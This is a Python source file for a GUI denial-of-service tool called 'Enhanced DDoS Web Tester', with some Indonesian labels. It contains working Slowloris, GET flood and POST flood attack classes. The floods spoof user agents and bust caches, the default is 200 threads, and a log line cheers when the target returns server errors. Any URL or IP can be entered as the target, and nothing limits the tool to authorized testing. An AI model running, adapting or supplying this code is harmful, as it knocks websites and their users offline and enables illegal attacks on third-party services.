import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading, socket, time, requests, random, os
from urllib.parse import urlparse
from queue import Queue
import psutil
import logging
from colorama import Fore, Style, init

init(autoreset=True)

logging.basicConfig(filename='ddos_attack.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

attack_running = False
request_queue = Queue()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/7.71.1",
    "Lynx/2.8.6rel.5 libwww-FM/2.14 SSL-MM/1.1.2 GNUTLS/2.12.17",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def format_bytes(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

class BaseAttack:
    def __init__(self, target, thread_count, log_callback):
        self.target = target
        self.thread_count = thread_count
        self.log_callback = log_callback
        self.attack_running = True
        self.threads = []

    def start(self):
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.attack, daemon=True)
            self.threads.append(thread)
            thread.start()

    def stop(self):
        self.attack_running = False
        for thread in self.threads:
            thread.join(timeout=1)

    def attack(self):
        raise NotImplementedError

class SlowlorisAttack(BaseAttack):
    def __init__(self, target_host, port, thread_count, log_callback):
        super().__init__(target_host, thread_count, log_callback)
        self.port = port
        self.sockets = []

    def attack(self):
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                self.sockets.append(sock)
                sock.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode("utf-8"))
                for _ in range(10):
                    header = f"X-a: {time.time()}\r\n"
                    sock.send(header.encode("utf-8"))
                    time.sleep(1.5)
                self.log_callback(f"[SL] Sent headers to {self.target}")
            except Exception as e:
                self.log_callback(f"[SL] Error: {e}")
                if sock in self.sockets:
                    self.sockets.remove(sock)
                sock.close()
            time.sleep(0.5)

    def stop(self):
        super().stop()
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []

class HTTPFloodAttack(BaseAttack):
    def __init__(self, target_url, thread_count, log_callback, method='GET'):
        super().__init__(target_url, thread_count, log_callback)
        self.method = method.upper()
        self.url = target_url
        self.success_count = 0
        self.fail_count = 0
        self.timeout_count = 0
        self.start_time = time.time()

    def attack(self):
        while self.attack_running:
            try:
                headers = {
                    'User-Agent': get_random_user_agent(),
                    'Cache-Control': 'no-cache',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': self.url,
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                payload = {"data": "X" * random.randint(5000, 10000)}
                if self.method == 'POST':
                    r = requests.post(self.url, data=payload, headers=headers, timeout=3)
                else:
                    r = requests.get(self.url + f"?cache={random.randint(1,100000)}", headers=headers, timeout=3)
                elapsed = time.time() - self.start_time
                self.success_count += 1
                speed = self.success_count / elapsed if elapsed > 0 else 0
                request_queue.put(len(r.content))
                self.log_callback(f"[{self.method}] {r.status_code} {r.reason} | Speed: {speed:.2f} req/s")
                if r.status_code >= 500:
                    self.fail_count += 1
                    self.log_callback(Fore.RED + f"🚨 Target kemungkinan tumbang! Status: {r.status_code}" + Style.RESET_ALL)
            except requests.exceptions.Timeout:
                self.timeout_count += 1
                self.log_callback(Fore.YELLOW + f"[{self.method}] Timeout Detected ⚠️" + Style.RESET_ALL)
            except Exception as e:
                self.fail_count += 1
                self.log_callback(f"[{self.method}] Error: {e}")
            time.sleep(0.05)

class DDoSApp:
    def __init__(self, master):
        self.master = master
        self.master.title("🔥 Enhanced DDoS Web Tester - XX3T1")
        self.master.geometry("900x700")
        self.master.configure(bg="#222")

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("TLabel", foreground="white", background="#222", font=('Segoe UI', 12))
        self.style.configure("TEntry", font=('Segoe UI', 12))
        self.style.configure("TButton", font=('Segoe UI', 12, 'bold'), padding=8)
        self.style.configure("TCombobox", font=('Segoe UI', 12))

        self.create_widgets()

        self.attack_instance = None
        self.bytes_sent = 0
        self.start_time = None
        self.stop_event = threading.Event()
        self.resource_monitor_thread = threading.Thread(target=self.resource_monitor, daemon=True)
        self.resource_monitor_thread.start()

    def create_widgets(self):
        input_frame = ttk.Frame(self.master, padding=10)
        input_frame.pack(fill=tk.X)

        ttk.Label(input_frame, text="🎯 Target (URL/IP):").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.url_entry = ttk.Entry(input_frame, width=60)
        self.url_entry.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=5)

        ttk.Label(input_frame, text="🧵 Jumlah Thread:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.thread_entry = ttk.Entry(input_frame, width=15)
        self.thread_entry.insert(0, "200")
        self.thread_entry.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(input_frame, text="💥 Jenis Serangan:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.attack_type = ttk.Combobox(input_frame, values=["Slowloris", "POST Flood", "GET Flood"], state="readonly")
        self.attack_type.current(0)
        self.attack_type.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        button_frame = ttk.Frame(self.master, padding=10)
        button_frame.pack(fill=tk.X)

        self.start_btn = ttk.Button(button_frame, text="🚀 Start Attack", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=10, pady=10)

        self.stop_btn = ttk.Button(button_frame, text="🛑 Stop Attack", command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side=tk.LEFT, padx=10, pady=10)

        self.stats_btn = ttk.Button(button_frame, text="📊 Show Stats", command=self.show_stats)
        self.stats_btn.pack(side=tk.LEFT, padx=10, pady=10)

        ttk.Label(self.master, text="📡 Log Serangan:").pack(pady=5)
        self.log = scrolledtext.ScrolledText(self.master, height=20, bg="#333", fg="#a3e635", font=("Consolas", 10))
        self.log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.log.tag_config("alert", foreground="red")

        self.status_bar = ttk.Label(self.master, text="Idle.", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def log_callback(self, msg):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {msg}\n"
        self.log.insert(tk.END, log_message)
        self.log.see(tk.END)
        logging.info(msg)

    def start_attack(self):
        global attack_running
        url = self.url_entry.get()
        try:
            thread_count = int(self.thread_entry.get())
        except:
            messagebox.showerror("Error", "Thread count must be an integer")
            return

        if not url:
            messagebox.showwarning("Oops", "Target URL cannot be empty!")
            return

        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        attack_type = self.attack_type.get()
        self.log_callback(f"🔥 Starting {attack_type} attack on {url} with {thread_count} threads")
        self.status_bar.config(text=f"Attacking: {url} ({attack_type})")
        self.start_time = time.time()

        attack_running = True

        parsed = urlparse(url)
        host = parsed.hostname or url
        port = parsed.port or (80 if parsed.scheme in ('http', '') else 443)

        if attack_type == "Slowloris":
            self.attack_instance = SlowlorisAttack(host, port, thread_count, self.log_callback)
        elif attack_type == "POST Flood":
            self.attack_instance = HTTPFloodAttack(url, thread_count, self.log_callback, method='POST')
        elif attack_type == "GET Flood":
            self.attack_instance = HTTPFloodAttack(url, thread_count, self.log_callback, method='GET')

        self.attack_instance.start()

    def stop_attack(self):
        global attack_running
        attack_running = False
        if self.attack_instance:
            self.attack_instance.stop()
            self.attack_instance = None
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log_callback("🛑 Attack stopped.")
        self.status_bar.config(text="Attack stopped.")
        self.stop_event.set()

    def show_stats(self):
        if isinstance(self.attack_instance, HTTPFloodAttack):
            s = self.attack_instance
            uptime = time.time() - s.start_time
            self.log_callback(f"📊 Statistik Live:\n  ✔️ Berhasil: {s.success_count}\n  ❌ Gagal: {s.fail_count}\n  ⏱ Timeout: {s.timeout_count}\n  🚀 Req/s: {s.success_count / uptime:.2f}")

    def resource_monitor(self):
        previous_bytes = 0
        while not self.stop_event.is_set():
            try:
                cpu_usage = psutil.cpu_percent(interval=1)
                mem_usage = psutil.virtual_memory().percent
                current_bytes = 0
                while not request_queue.empty():
                    current_bytes += request_queue.get()
                bandwidth = (current_bytes - previous_bytes) * 8
                bandwidth_mbps = bandwidth / (1024 * 1024)
                previous_bytes = current_bytes
                status_text = (
                    f"CPU: {cpu_usage:.1f}% | Mem: {mem_usage:.1f}% | Bandwidth: {bandwidth_mbps:.2f} Mbps"
                )
                self.status_bar.config(text=status_text)
                time.sleep(1)
            except Exception as e:
                logging.error(f"Resource monitor error: {e}")
                break
        self.status_bar.config(text="Resource monitoring stopped.")

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSApp(root)
    root.mainloop()